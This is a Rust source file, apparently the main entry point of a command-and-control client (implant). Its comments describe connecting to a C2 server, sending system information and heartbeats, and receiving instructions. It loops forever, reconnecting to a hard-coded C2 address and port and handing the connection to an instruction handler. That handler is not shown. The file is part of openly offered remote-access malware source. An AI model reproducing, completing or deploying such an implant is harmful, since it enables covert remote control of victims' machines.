mod sys_info;
mod handler;
mod config;

use std::io::{self};
use std::net::TcpStream;
use std::{thread, time};

use handler::{listening_for_instructions};

/// The main entry point of the client application.
///
/// Establishes a connection to the server for command and control operations,
/// sends initial system information to the server, and manages separate
/// functionalities for sending heartbeats and listening for instructions.
fn main() -> io::Result<()> {
    // C2 address port
    let ip = "127.0.0.1".to_string();
    let port = "8080".to_string();


    loop {

        println!("Connecting to server {}:{}.", ip, port);

        match TcpStream::connect(format!("{}:{}", ip, port)) {
            Ok(mut stream) => {
                println!("Connected to {}:{}!", ip, port);
                // Infinite loop
                listening_for_instructions(&mut stream).unwrap();

            }
            Err(_) => {
                println!("Error connecting. Trying again...");
                thread::sleep(time::Duration::from_secs(3));
            }
        };

    }

    Ok(())
}

